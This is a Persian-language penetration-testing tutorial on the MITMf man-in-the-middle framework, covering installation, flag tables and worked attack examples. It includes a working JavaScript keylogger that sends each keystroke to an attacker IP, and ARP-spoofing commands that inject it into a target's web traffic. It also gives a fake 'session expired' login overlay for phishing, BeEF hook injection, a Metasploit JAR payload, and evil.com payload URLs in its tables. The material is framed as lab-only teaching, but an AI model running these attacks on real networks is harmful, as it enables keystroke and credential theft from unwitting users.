---
Episode: E4
Date: 2026-05-03T18:28:00
Title: Network Attacks - General Models
tags:
  - Networking
  - network_security
  - network_attacks
  - Network_Pentest
Categories:
  - Networking
  - Network Pentesting
  - Network Security
Is Finished?:
Practice Status:
Spend Time:
Tools:
banner:
banner_icon:
Home:
Previous Episode:
Next Episode:
---
--------
#### 3: MITMf - Wizard of Injection and Manipulation
##### Description
###### Introduction
در این فصل، به سراغ یکی از قدرتمندترین و در عین حال ساده‌ترین ابزارهای حوزه حملات مرد میانی می‌رویم: MITMf
این ابزار که نام آن مخفف Man-In-The-Middle Framework است و توسط محققی به نام byt3bl33d3r  به زبان پایتون توسعه یافته است. هدف اصلی آن، فراهم آوردن بستری ماژولار و قابل گسترش برای اجرای حملات پیشرفته MITM است و تمرکز ویژه‌ای برروی تزریق کد و دستکاری ترافیک دارد. اگر Bettercap یک چاقوی Swiss Army باشد، MITMf یک سرنگ دقیق برای تزریق کد به ترافیک قربانی است.
تمامی مطالب این فصل **صرفاً جهت اهداف آموزشی و استفاده در محیط‌های آزمایشگاهی ایزوله** ارائه می‌شود.

- **مخزن GitHub ابزار MITMf:**
	- https://github.com/byt3bl33d3r/MITMf

اگرچه توسعه پروژه MITMf در مخزن گیت‌هاب از سال ۲۰۱۸ متوقف و در وضعیت "Archived" قرار گرفته است، اما این چارچوب به واسطه معماری ماژولار، گستره حملات و سادگی کم‌نظیرش، همچنان جایگاه خود را به عنوان یکی از پنج ابزار برتر در حوزه حملات مرد میانی (MITM) حفظ کرده است.
###### History and Philosophy
پیش از ظهور MITMf، متخصصان امنیت برای اجرای یک حمله کامل MITM مجبور بودند چندین ابزار مختلف را به صورت دستی با یکدیگر ترکیب کنند: یک ابزار برای ARP Spoofing، ابزاری دیگر برای شنود ترافیک، ابزاری جداگانه برای تزریق کد، و الی آخر. این فرآیند نه تنها زمان‌بر بود، بلکه احتمال خطا و ناسازگاری بین ابزارها را نیز افزایش می‌داد.

محققی بنام **byt3bl33d3r** با درک این چالش، در سال 2014 پروژه MITMf را پایه‌گذاری کرد. فلسفه اصلی طراحی این ابزار را می‌توان در یک جمله خلاصه کرد: **"یک چارچوب، تمام نیازها"**. MITMf با بهره‌گیری از قدرت **Scapy** و **Python**، تمامی اجزای یک حمله MITM را در یک ساختار منسجم و ماژولار گرد هم آورد.

###### Main Features

| ویژگی                                      | توضیح                                                                                                                                                                                                                      |
| ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| معماری ماژولار (Modular Architecture       | هر قابلیت (ARP Spoofing، DNS Spoofing، تزریق کد) یک پلاگین مستقل است که می‌توان آن را فعال یا غیرفعال کرد                                                                                                                  |
| تزریق پیشرفته کد (Advanced Code Injection) | قابلیت تزریق انواع محتوا (HTML، JavaScript، فایل‌های کامل) به ترافیک عبوری                                                                                                                                                 |
| یکپارچگی با BeEF                           | ارسال خودکار قلاب (Hook) مرورگر هدف به چارچوب BeEF برای کنترل کامل مرورگر                                                                                                                                                  |
| پشتیبانی از پروتکل‌ های متعدد              | پروتکل هایی مانند HTTP، HTTPS، DNS، DHCP، SMB و غیره                                                                                                                                                                       |
| حالت ترکیبی (Hybrid Mode)                  | امکان ترکیب چندین حمله به صورت همزمان                                                                                                                                                                                      |
| گزارش‌گیری خودکار                          | ثبت تمامی اطلاعات کاربری و داده‌های حساس در فایل‌های Log                                                                                                                                                                   |
| فیلتر ها                                   | به جای سیستم پیچیده کامپایل فیلتر در Ettercap، از فیلترهای پایتون استفاده می‌کند. با فلگ `F-` یک فایل `.py` به آن می‌دهیم که با استفاده از Scapy، بسته‌ها را دستکاری می‌کند                                                |
###### Main Usage
ابزار MITMf در سناریوهای متنوعی از تست نفوذ و ارزیابی امنیتی به کار می‌آید:
1. **ارزیابی امنیت وب‌سایت‌ها:** نمایش آسیب‌پذیری در برابر تزریق کد و حملات XSS.
    
2. **تغییر در ترافیک:** ایجاد تغییرات در تمامی اجزا ترافیک HTTP/HTTPS
    
3. **تست آگاهی کارکنان:** شبیه‌سازی حملات فیشینگ برای سنجش سطح آگاهی امنیتی.
    
4. **تحلیل ترافیک شبکه:** شنود و تحلیل ترافیک HTTP/HTTPS برای شناسایی نشتی اطلاعات.
    
5. **ارزیابی امنیت Wi-Fi:** ترکیب با حملات KARMA یا Evil Twin برای تست امنیت شبکه‌های بی‌سیم.

##### Installation & Usage Guide
###### Installation Steps
ابزار MITMf با Python 2 نوشته شده و به تعداد زیادی از کتابخانه های خارجی پایتون وابسته است. به همین دلیل و برای دوری از مشکلات مجوز (Permissions) و تداخل (Conflict)  پیشنهاد میشود برای نصب فریم ورک MITMf از محیط مجازی پایتون (Python Virtual Environment) استفاده کنیم. (مخصوصا در Kali Linux)

1. **مرحله اول:** نصب پکیج های مورد نیاز
در Arch Linux:
```sh
pacman -S python2-setuptools libnetfilter_queue libpcap libjpeg-turbo capstone
```

- در لینوکس های Debian پایه (مانند: Kali Linux, Ubuntu, و ...):
```sh
apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
```
نکته: اگر از Arch Linux استفاده میکنید عالیست، فقط به یاد داشته باشید که از `pip2` بجای `pip` در بیرون از virtualenv استفاده کنید.

2. **مرحله دوم:** نصب `virtualenvwrapper`
```sh
pip install virtualenvwrapper
```

3. **مرحله سوم:** ویرایش `bashrc.` یا `zshrc.` (براساس shell که استفاده میکنیم) و source کردن اسکریپت `virtualenvwrapper.sh` با اضافه کردن خط زیر:
	1. مسیر `virtualenvwrapper.sh` در هر توزیع لینوکس متفاوت است:
		1. `/usr/bin/virtualenvwrapper.sh` 
		2. `/usr/local/bin/virtualenvwrapper.sh`
	2. برای یافتن مسیر درست کافیست کامند های زیر را یکبار اجرا کنید، اگر خروجی مشاهده شد مسیر درست را یافتید اما اگر No Such File را مشاهده کردید، مسیر اشتباه است.
		1. `source /usr/bin/virtualenvwrapper.sh`
		2. `source /usr/local/bin/virtualenvwrapper.sh `
```sh
#Edit .zshrc | .bashrc
sudo nano ~/.zshrc
#or
sudo nano ~/.bashrc

#Now add below line:
source /usr/bin/virtualenvwrapper.sh
#or
source /usr/local/bin/virtualenvwrapper.sh 
```
حال ترمینال را ریستارت کنید.

4. **مرحله چهارم:** ساخت virtualenv با python2.7
```sh
mkvirtualenv MITMf -p /usr/bin/python2.7
```

5. **مرحله پنجم:** Clone کردن مخزن گیت‌هاب MITMf 
```sh
git clone https://github.com/byt3bl33d3r/MITMf
```

6. **مرحله ششم:** Initialize و Clone کردن Sub Modules های مخزن
	1. مخزن MITMf یکسری Sub Module دارد که پس از Clone کردن مخزن اصلی باید آنها را نیز در پروژه اضافه کنیم. (Initialize & Clone)
```sh
cd MITMf 
git submodule init 
git submodule update --recursive
```

7. **مرحله هفتم:** نصب پیش‌نیازهای پایتون
```sh
pip install -r requirements.txt
```

- نصب چهارچوب MITMf به اتمام رسید. اکنون میتوانیم ابزار را با python2 اجرا کنیم:
```sh
sudo python2 mitmf.py --help
```

- در نصب ابزار روی سیستم های جدید به مشکل خوردید؟ از مخزن Fork شده GabrielePicco استفاده کنید:
	- بدلیل اینکه MITMf با زبان Python 2 نوشته شده است برای اجرا نیازمند کتابخانه‌ها و نسخه‌های قدیمی پایتون 2 است و نصب آن بر روی سیستم‌های به‌روز ممکن است با خطا مواجه شود. اگر به این نوع از مشکلات برخوردید میتوانید از مخزن جایگزین MITMf که یک Fork رسمی از ابزار است و توسط **GabrielePicco** نگهداری میشود استفاده کنید. این مخزن تمامی ویژگی ها و امکانات MITMf اصلی را دارد و مهم‌ترین مزیت آن، رفع برخی از باگ‌ها و بهبود پایداری برای اجرا روی سیستم‌های جدیدتر است.
	- آدرس مخزن:
	- https://github.com/GabrielePicco/MITMf
###### MITMf from GabrielePicco Repository
###### Starting MITMf
در اصل، MITMf فقط یک نسخه‌ی بهبود یافته از SSLstrip است که چند ترفند در دست دارد. برای اجرای ابزار:
```sh
python mitmf.py -i interface
```

- **با اجرای کامند بالا چندین اتفاق رخ میدهد:**
1. پراکسی SSLstrip شروع می‌شود؛ این پراکسی هر افزونه‌ای را که از خط فرمان فراخوانی کرده‌ایم بارگذاری می‌کند، همچنین تمامی ترافیک HTTP را می‌گیرد و آن را طبق خواسته‌مان تغییر می‌دهد.
2. یک سرور HTTP، DNS و SMB نیز راه‌اندازی می‌شود؛ این سرورها عمدتاً در کنار افزونه‌های MITMf استفاده می‌شوند 
3. ابزار NetCreds راه‌اندازی می‌شود؛ وظیفه NetCreds شناسایی تمام اعتبارنامه‌های متنی (clear-text credentials) در لایه سوم شبکه است.
4. سرویس وب MITMf-API راه‌اندازی می‌شود؛ سرویس وب MITMF-API یک API را ارائه می‌دهد که می‌توان از آن برای فعال و غیرفعال کردن افزونه‌ها از راه دور استفاده کرد

###### Usage Guide (Parameters & Targets)
برای درک بهتر نحوه عملکرد و پارامترهای MITMf، از یک کامند به عنوان مثال که ترکیبی از قابلیت‌ها است استفاده میکنیم و آنرا بخش‌به‌بخش تحلیل میکنیم:

```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --js-file /root/keylogger.js -i eth0
```

- `sudo python3 mitmf.py`: 
	- اجرای چارچوب MITMf با دسترسی مدیر سیستم
    
- `--arp`:
	- این فلگ، نوع حمله MITM را مشخص می‌کند و در اینجا به چارچوب می‌گوییم که از پروتکل ARP برای قرارگیری در مسیر ترافیک استفاده کند.
    
- `--spoof`: 
	- این فلگ، فعال‌سازی عملیات جعل (Spoof) است. به‌طور کلی در کنار `arp--` یا `dhcp--` می‌آید و فرمان شروع حمله را صادر می‌کند.
    
- `--gateway 192.168.1.1`:
	- آدرس IP گیت‌وی شبکه را مشخص می‌کند. وارد کردن این پارامتر برای ارسال درست بسته‌های جعلی ARP حیاتی است.

- `--targets 192.168.1.10`:
	- آدرس IP هدف (دستگاهی که می‌خواهیم ترافیک آن را رهگیری کنیم) را مشخص می‌کند.
	- **نحوه تعیین اهداف:** MITMf در تعیین اهداف بسیار انعطاف‌پذیر است. می‌توانیم:
	    -  `--targets 192.168.1.10` یک عدد آیپی را وارد کنیم
		- `--targets 192.168.1.10,192.168.1.20` چندین آیپی مجزا را با کاما جدا کنیم
		- `--targets 192.168.1.10-50` یک بازه آیپی مشخص کنیم
	    - `--targets 192.168.1.0/24` کل یک ساب‌نت را هدف قرار دهیم
        
- `--inject`:
	- فعال‌سازی ماژول اصلی تزریق در MITMf. این فلگ به چارچوب می‌گوید که ترافیک عبوری را برای تزریق محتوا آماده کند.
    
- `--js-file /root/keylogger.js`:
	- یک زیرمجموعه از قابلیت تزریق است که مشخص می‌کند یک فایل جاوااسکریپت محلی، به صفحات HTML تزریق شود. در اینجا فایل `keylogger.js` در مسیر `/root/` برای تزریق انتخاب شده است.
	- سایر مدل های تزریق هم وجود دارند که در ادامه آنها را بررسی میکنیم.
    
- `-i eth0`: 
	- تعیین اینترفیس شبکه که حمله از طریق آن انجام می‌شود. در اینجا اینترفیس `eth0` است.
##### MITMf Flags
فلگ‌ها در MITMf نقش تعیین‌کننده‌ای در نحوه اجرای چهارچوب دارند. در ادامه، تمامی فلگ‌های اصلی و پرکاربرد را با توضیح کامل بررسی می‌کنیم.
###### MITM Main Flags

| فلگ         | عنوان         | کاربرد                                         | مثال                                  |
| ----------- | ------------- | ---------------------------------------------- | ------------------------------------- |
| `--arp`     | ARP Spoofing  | فعال‌سازی ماژول ARP Spoofing                   | `--arp`                               |
| `--spoof`   | Spoofing Mode | تعیین حالت جعل (همراه با `--arp` یا `--dhcp`)  | `--spoof`                             |
| `--gateway` | Gateway IP    | مشخص کردن IP گیت‌وی                            | `--gateway 192.168.1.1`               |
| `--targets` | Target IP(s)  | تعیین IP هدف (می‌تواند چند IP با کاما جدا شود) | `--targets 192.168.1.10,192.168.1.11` |
| `-i`        | Interface     | تعیین اینترفیس شبکه                            | `-i eth0`                             |

###### Injection Content Flags
قدرت اصلی MITMf در پیاده سازی انواع Injection است. فلگ اصلی تزریق `inject--` است که سایر فلگ هایی که در جدول زیر ذکر میکنیم در ادامه این فلگ استفاده میشوند.

| فلگ               | عنوان                | کاربرد                                                | مثال                                      |
| ----------------- | -------------------- | ----------------------------------------------------- | ----------------------------------------- |
| `--inject`        | Enable Injection     | فعال‌سازی ماژول تزریق                                 | `--inject`                                |
| `--js-file`       | JavaScript File      | مسیر فایل JS برای تزریق                               | `--js-file /root/payload.js`              |
| `--js-url`        | JavaScript URL       | آدرس URL اسکریپت JS برای تزریق                        | `--js-url http://evil.com/payload.js`     |
| `--js-payload`    | JavaScript Payload   | یک رشته JS را بصورت مستقیم تزریق میکند                | `--js-payload "<script> ..."`             |
| `--html-file`     | HTML File            | مسیر فایل HTML برای تزریق                             | `--html-file /root/phish.html`            |
| `--html-url`      | HTML URL             | آدرس URL محتوای HTML برای تزریق                       | `--html-url http://evil.com/phish.html`   |
| `--html-payload`  | HTML Payload         | تزریق رشته کد HTML بصورت مستقیم                       | `--html-payload "<div> ..."`              |
| `--image-file`    | Image File           | مسیر فایل تصویر برای جایگزینی                         | `--image-file /root/fake.jpg`             |
| `--image-url`     | Image URL            | آدرس URL تصویر برای جایگزینی                          | `--image-url http://evil.com/fake.jpg`    |
| `--beef-hook`     | BeEF Hook Injection  | تزریق هوک BeEF به صفحات                               | `--beef-hook`                             |
| `--beef-url`      | Custom BeEF URL      | آدرس سفارشی سرور BeEF                                 | `--beef-url http://10.0.0.5:3000/hook.js` |
| `--jskeylogger`   | JavaScript Keylogger | فعال‌سازی Key Logger جاوااسکریپت داخلی                | `--jskeylogger`                           |
| `--appoison`      | App Cache Poisoning  | مسموم‌سازی کش برنامه‌های HTML5                        | `--appoison`                              |
| `--java-payload`  | Java Applet Payload  | مسیر فایل JAR برای تزریق اپلت جاوا                    | `--java-payload /root/payload.jar`        |
| `--per-domain`    | Per Domain           | تزریق براساس هر دامنه در هر کلاینت                    | `--per-domain`                            |
| `--rate-limit`    | Rate Limit           | تزریق در هر ثانیه مشخص شده                            | `--rate-limit 5`                          |
| `--count-limit`   | Count Limit          | محدود کردن تعداد تزریق                                | `--count-limit 10`                        |
| `--white-ips`     | White IP List        | تزریق فقط برای آیپی های مشخص شده(جدا کردن با کاما)    | `--white-ips 192.168.10.10,192.168.20.10` |
| `--black-ips`     | Black IP List        | تزریق نکردن برای آیپی های مشخص شده(جدا کردن با کاما)  | `--black-ips 192.168.10.10,192.168.20.10` |
| `--white-domains` | White Domain List    | تزریق فقط برای دامنه های مشخص شده(جدا کردن با کاما)   | `--white-domains facebook.com,google.com` |
| `--black-domains` | Black Domain List    | تزریق نکردن برای دامنه های مشخص شده(جدا کردن با کاما) | `--black-domains facebook.com,google.com` |
###### Spoofing Flags

| فلگ          | شکل کامل               | کاربرد                         | مثال                        |
| ------------ | ---------------------- | ------------------------------ | --------------------------- |
| `--dns`      | DNS Spoofing           | فعال‌ سازی ماژول جعل DNS       | `--dns`                     |
| `--dns-file` | DNS Configuration File | مسیر فایل پیکربندی DNS         | `--dns-file /root/dns.conf` |
| `--dhcp`     | DHCP Spoofing          | فعال‌ سازی ماژول جعل DHCP      | `--dhcp`                    |
| `--dhcp-dns` | DHCP DNS Server        | تنظیم DNS Server در DHCP Offer | `--dhcp-dns 8.8.8.8`        |
| `--smb`      | SMB Server             | فعال‌ سازی سرور SMB جعلی       | `--smb`                     |

###### Analysis & Monitoring Flags

| فلگ           | شکل کامل         | کاربرد                               | مثال                        |
| ------------- | ---------------- | ------------------------------------ | --------------------------- |
| `--sniff`     | Traffic Sniffing | فعال‌ سازی اسنیفینگ ترافیک           | `--sniff`                   |
| `--log-level` | Logging Level    | تنظیم سطح لاگ (DEBUG, INFO, WARNING) | `--log-level DEBUG`         |
| `--log-dir`   | Log Directory    | مسیر ذخیره فایل‌های لاگ              | `--log-dir /tmp/mitmf_logs` |
| `--pcap`      | PCAP Output      | ذخیره ترافیک در فایل PCAP            | `--pcap capture.pcap`       |

###### Modules/Plugin Activation Flags

| فلگ                  | کاربرد                                                                               |
| :------------------- | ------------------------------------------------------------------------------------ |
| `--responder`        | فعال‌سازی ماژول Responder برای مسموم‌سازی LLMNR, NBT-NS و MDNS.                      |
| `--wpad`             | (به همراه `responder--`) فعال‌سازی سرور جعلی WPAD برای حملات پروکسی خودکار.          |
| `--wredir`           | (به همراه `responder--`) فعال‌سازی تغییر مسیر NetBIOS.                               |
| `--nbtns`            | (به همراه `responder--`) فعال‌سازی مسموم‌سازی NetBIOS Name Service.                  |
| `--shellshock`       | اجرای یک پیلود ShellShock بر روی کلاینت‌های آسیب‌پذیر.                               |
| `--captive`          | فعال‌سازی یک Captive Portal که تمام درخواست‌های HTTP را به یک صفحه خاص هدایت می‌کند. |
| `--portalurl`        | (به همراه `--captive`) تنظیم آدرس صفحه Captive Portal.                               |
| `--screen`           | فعال‌سازی پلاگین ScreenShotter برای گرفتن اسکرین‌شات از مرورگر هدف.                  |
| `--upsidedownternet` | فعال‌سازی پلاگین Upsidedownternet که تصاویر صفحات وب را 180 درجه می‌چرخاند.          |
| `-F`                 | بارگذاری یک فیلتر پایتون سفارشی برای دستکاری بسته‌ها (مشابه فیلترهای Ettercap).      |

###### Additional Configuration Flags

| فلگ          | شکل کامل        | کاربرد                                | مثال                               |
| ------------ | --------------- | ------------------------------------- | ---------------------------------- |
| `--ignore`   | Ignore IPs      | نادیده گرفتن IP های مشخص              | `--ignore 192.168.1.1,192.168.1.2` |
| `--arpmode`  | ARP Mode        | حالت ARP Spoofing (rep یا req)        | `--arpmode rep`                    |
| `--interval` | Poison Interval | فاصله بین بسته‌های ARP Poison (ثانیه) | `--interval 3`                     |
| `--threads`  | Thread Count    | تعداد Thread های همزمان               | `--threads 4`                      |

##### JavaScript Injection Modes
قدرت اصلی MITMf در توانایی **تزریق محتوا** به ترافیک زنده شبکه است. این قابلیت از طریق ماژول `inject--` فعال می‌شود و زیرمجموعه‌ های مختلفی دارد که هر کدام برای هدف خاصی طراحی شده‌اند.
###### Description
**توضیح کلی:**  
در این روش، کد جاوااسکریپت دلخواه به صفحات وب که هدف باز می‌کند تزریق می‌شود. این کد می‌تواند یک Keylogger، یک ربات کنترل از راه دور (با BeEF)، یا هر اسکریپت سفارشی دیگری باشد. 

**زیر روش‌ها:**
1. تزریق از طریق فایل محلی با فلگ `js-file--`
2. تزریق از طریق URL با فلگ `js-url--`
3. تزریق هوک BeEF با فلگ های `beef-hook--` و `beef-url--`

###### 1: JS Injection with Local JS File (`--js-file`)
**قاعده کلی:**  
مسیر یک فایل `.js` روی سیستم خود را به MITMf می‌دهیم. محتوای این فایل به انتهای تمام صفحات HTML تزریق می‌شود.

**مثال استفاده:** تزریق Keylogger به زبان JS
1. **مرحله اول:** ساخت  `/root/keylogger.js`:
```javascript
//Custom Keylogger (ضبط کننده سفارشی کلید های فشرده شده کیبرد)
document.addEventListener('keypress', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://192.168.1.99:8080/k?key=' + encodeURIComponent(e.key), true);
    xhr.send();
});
```

2. **مرحله دوم:** تزریق Key Logger سفارشی
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --js-file /root/keylogger.js -i eth0
```
- **نتیجه:**
	- با اجرای این خط، MITMf حمله ARP Cache Poisoning(ARP Spoofing) را اجرا کرده و آیپی 192.168.1.1 را به عنوان Gateway برای هدف 192.168.1.10 تنظیم میکند تا تمام ترافیک 192.168.1.10 را به سمت خود هدایت کند. 
	- سپس فایل `/root/keylogger.js` را به دستگاه 192.168.1.10 تزریق میکند تا کلیدهای فشرده شده در این دستگاه را برداشته و به سمت 192.168.1.1که آیپیی دستگاه تست نفوذگر است ارسال کند.
	- بنابراین MITMf در اینجا چندین حمله شبکه را در یک کامند ترکیب کرد.

- **توضیحات تکمیلی:**
	- Key Logger: `Module 0: Perquisites => Concepts => Key Logger`
###### 2: JS Injection with URL (`--js-url`)
**قاعده کلی:**  
در این روش به جای فایل جاوااسکریپت محلی، آدرس یک اسکریپت آنلاین را می‌دهیم. MITMf یک تگ `<script>` با آدرس مشخص‌شده به صفحه تزریق می‌کند.

**مثال استفاده:** تزریق Payload جاوااسکریپت بوسیله URL
1. **مرحله اول:** آماده سازی JS آنلاین
	1. اسکریپت JS را که میخواهیم به هدف تزریق کنیم را در یک فایل JS درون وبسرور(اینترنت یا شبکه محلی) قرار میدهیم و سپس URL آنرا کپی میکنیم.
```javascript
//File: /root/keylogger.js
document.addEventListener('keypress', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://192.168.1.99:8080/k?key=' + encodeURIComponent(e.key), true);
    xhr.send();
});
```

- اجرا در وبسرور محلی:
```sh
sudo python3 -m http.server 80 -d /root &
```

2. **مرحله دوم:** اجرا حمله و تزریق اسکریپت از راه دور
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --js-url http://192.168.1.99/payload.js -i eth0
```
- `192.168.1.99` آیپی سرور تست نفوذگر است که وبسرور در آن اجرا شده. میتواند آدرس سرور تست نفوذگر در اینترنت باشد.

###### 3: BeEF Hook Injection (`--beef-hook`)
**قاعده کلی:**  
این گزینه به صورت خودکار هوک BeEF را به صفحات تزریق می‌کند. اگر BeEF روی پورت پیش‌فرض (3000) اجرا شود، نیازی به تنظیم اضافه نیست در غیر اینصورت با استفاده از `beef-url--` آدرس آیپی : پورت سفارشی BeEF را مشخص میکنیم.

1. **مثال اول:** تزریق خودکار BeEF Hook
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --beef-hook -i eth0
```

2. **مثال دوم:** تزریق BeEF Hook با آدرس سفارشی
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --beef-hook --beef-url http://10.0.0.5:3000/hook.js -i eth0
```
- `10.0.0.5:3000` آیپی و پورت سرور تست نفوذگر است که BeEF در آن اجرا شده است. میتواند آدرس هاست VPS(Virtual Private Server) تست نفوذگر در اینترنت باشد.
###### Cheat Sheet
```sh
#1: --js-file
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --js-file /root/keylogger.js -i eth0
    
#2: --js-url
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --js-url http://192.168.1.99/payload.js -i eth0
    
#3.1: --beef-hook(Default Address)
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --beef-hook -i eth0
#3.2: --beef-hook & --beef-url(Customize BeEF Address)
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --beef-hook --beef-url http://10.0.0.5:3000/hook.js -i eth0
```
##### HTML Injection Modes
###### Description
- **توضیح کلی `html-file--`:**  
	- در این روش، کد HTML دلخواه را به صفحات وب تزریق میکنیم. این قابلیت برای شبیه‌سازی حملات فیشینگ، نمایش هشدارهای امنیتی، یا Defacement(تغییر محتوا) صفحات وب کاربرد دارد.

- **روش‌ های تزریق:**
	1. تزریق فایل HTML - فلگ `html-file--`
	2. تزریق HTML از URL - فلگ `html-url--`

- **قاعده کلی:**  
	- محتوای فایل HTML مشخص‌شده، درست پس از تگ `<body>` صفحه هدف درج می‌شود.
###### 1: `--html-file` HTML Injection with File
1. **مرحله اول:** ساخت فایل `/root/fake_login.html`
```html
<div style="position:fixed;top:20%;left:30%;background:white;padding:30px;
     border:2px solid red;z-index:99999;box-shadow:0 0 20px rgba(0,0,0,0.5);">
    <h3 style="color:red;">هشدار امنیتی</h3>
    <p>نشست شما منقضی شده است. لطفاً مجدداً وارد شوید:</p>
    <input type="text" placeholder="نام کاربری" style="width:100%;margin:5px 0;padding:8px;"><br>
    <input type="password" placeholder="رمز عبور" style="width:100%;margin:5px 0;padding:8px;"><br>
    <button style="background:blue;color:white;padding:10px 20px;border:none;">Login</button>
</div>
```

2. **مرحله دوم:** تزریق فایل HTML(میتواند صفحه Phishing باشد)
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --html-file /root/fake_login.html -i eth0
```

###### 2: `--html-url` HTML Injection with URL
1. **مرحله اول:** آماده سازی فایل HTML در وبسرور
	1. برای تزریق از صفحه HTML که در مثال اول ساختیم، استفاده میکنیم: `/root/fake_login.html`
```sh
sudo python3 -m http.server 80 -d /root &
```

2. **مرحله دوم:** تزریق محتوای HTML از طریق URL(راه دور)
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --html-url http://192.168.1.99/phishing_banner.html -i eth0
```
- `192.168.1.99` آیپی سرور تست نفوذگر است که وبسرور در آن اجرا شده. میتواند آدرس سرور تست نفوذگر در اینترنت باشد.
###### Cheat Sheet
```sh
#1: --html-file (HTML Injection with File)
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --html-file /root/fake_login.html -i eth0

#2: --html-url (HTML Injection with URL)
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --html-url http://192.168.1.99/phishing_banner.html -i eth0
```
##### Image Replacement Modes
###### Description
- **توضیح کلی:**  
	- در این روش، تمام تصاویر موجود در صفحات وب با یک تصویر دلخواه جایگزین می‌شوند. این قابلیت برای نمایش بصری تأثیر حملات MITM بسیار مؤثر است.

- **روش‌ های تزریق:**
	1. جایگزینی تصاویر با فایل محلی - فلگ `--image-file`
	2. جایگزینی تصاویر با URL - فلگ `--image-url`
###### 1: Image Replacement with File
در این مثال تمام تصاویر موجود در هدف را با یک لوگوی آموزشی `/root/security_warning.jpg` جایگزین میکنیم.

1. **اجرای جایگزینی:**
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --image-file /root/security_warning.jpg -i eth0
```

###### 2: Image Replacement with URL
در این مثال تمام تصاویر موجود در هدف را با یک تصویر اینترنتی `http://mywebsite.com/logo.png` جایگزین میکنیم.
- **اجرای جایگزینی:**
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --image-url http://mywebsite.com/logo.png -i eth0
```

###### Cheat Sheet
```sh
#1: Image Replacement with File
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --image-file /root/security_warning.jpg -i eth0

#2: Image Replacement with URL
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --image-url http://mywebsite.com/logo.png -i eth0
```
##### Other Injection Modes
###### 1: `--java-payload` Java Applet Injection 
- **توضیح کلی:**  
	- این روش یک Java Applet (فایل `jar`) را به صفحات وب تزریق می‌کند. اگر مرورگر هدف از جاوا پشتیبانی کند (امروزه نادر است)، اپلت اجرا شده و می‌تواند دسترسی سطح سیستم‌ عامل فراهم کند.

1. **مرحله اول:** آماده سازی Applet Java(فایل `jar.`)
	- ابتدا نیاز است که فایل `jar.` را در مسیری مشخص آماده کنیم. در این سناریو برای مثال یک Metasploit Payload را در مسیر `/root/metasploit_payload.jar` قرار دادیم.

2. **مرحله دوم:** تزریق Java Applet
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --java-payload /root/metasploit_payload.jar -i eth0
```

- **نکته مهم:** این روش در مرورگرهای مدرن (Chrome، Firefox، Edge) که پشتیبانی از NPAPI را متوقف کرده‌اند، عملاً بی‌اثر است و صرفاً برای اهداف تاریخی و آکادمیک ذکر می‌شود.

###### 2: `--jskeylogger` JavaScript Keylogger
- **توضیح کلی:**
	- ابزار MITMf دارای یک Key Logger جاوا اسکریپت داخلی است که بدون نیاز به نوشتن کد جداگانه، تمام کلیدهای فشرده‌ شده توسط هدف را ثبت و در فایل‌های لاگ ذخیره می‌کند.
	- مسیر فایل لاگ حاوی کلید های فشرده شده `/var/log/mitmf/jskeylogger.log` میباشد.

- **روش فعالسازی Key Logger داخلی MITMf:**
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 --jskeylogger -i eth0

#See(Follow) Logged Keys
tail -f /var/log/mitmf/jskeylogger.log
#or simple read it
cat /var/log/mitmf/jskeylogger.log
```

###### 3: `--appoison` App Cache Poisoning
- **توضیح کلی:**
	- این روش از قابلیت App Cache در HTML5 سوءاستفاده می‌کند. با دستکاری فایل `manifest.appcache`، می‌توان نسخه‌های مخرب از فایل‌های وب‌سایت را در مرورگر هدف ذخیره کرد.

```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 --appoison -i eth0
```

- فایل ها و روش کانفیگ این پلاگین را در فصل MITMf Configuration توضیح خواهیم داد.
------

**توضیحات تکمیلی:** 
- **فایل `manifest.appcache`:**
	- قابلیت Application Cache (App Cache) یک استاندارد قدیمی در HTML5 بود که به وب‌سایت‌ها اجازه می‌داد فهرستی از منابع (مانند فایل‌های CSS، JS، تصاویر) را برای استفاده آفلاین در مرورگر کاربر ذخیره کنند. این فهرست در فایلی به نام `manifest.appcache` تعریف می‌شد.

- **حمله AppCache Poisoning:**
	- حمله AppCache Poisoning در MITMf از قابلیت App Cache (فایل `manifest.appcache`) سوءاستفاده می‌کند. مهاجم با دستکاری فایل manifest در ترافیک، مرورگر هدف را وادار می‌کند تا نسخه‌های مخرب و آلوده‌ای از فایل‌های وب‌سایت را کش کند. 
